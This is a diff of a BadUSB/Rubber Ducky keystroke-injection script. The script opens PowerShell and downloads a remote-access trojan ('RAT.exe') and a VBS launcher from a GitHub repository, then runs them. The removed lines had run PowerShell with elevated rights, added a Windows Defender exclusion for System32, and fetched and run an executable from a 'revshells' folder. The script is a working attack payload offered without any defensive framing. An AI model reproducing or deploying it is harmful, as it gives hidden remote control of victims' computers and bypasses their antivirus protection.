@@ -1,21 +1,9 @@
-DELAY 100
 GUI r 
 DELAY 1000
 STRING powershell
-STRING  start-process PowerShell -verb runas
-DELAY 100
-ENTER
-DELAY 3000 
-LEFT
-DELAY 100
-ENTER
-DELAY 500
-STRING Add-MpPreference -ExclusionPath "C:\Windows\System32";
 STRING  wget https://github.com/AlexanderBissett/
-STRING Yurii-is-a-idiot/raw/main/revshells/sky.exe -o sky.exe;
-STRING  .\sky.exe
-DELAY 100
-ENTER
-DELAY 100
-STRING exit
+STRING Yurii-is-a-idiot/raw/main/Software/RAT/RAT.exe -O RAT.exe;
+STRING  wget https://github.com/AlexanderBissett/
+STRING Yurii-is-a-idiot/raw/main/Software/RAT/black.vbs -O black.vbs;
+STRING  wscript black.vbs
 ENTER
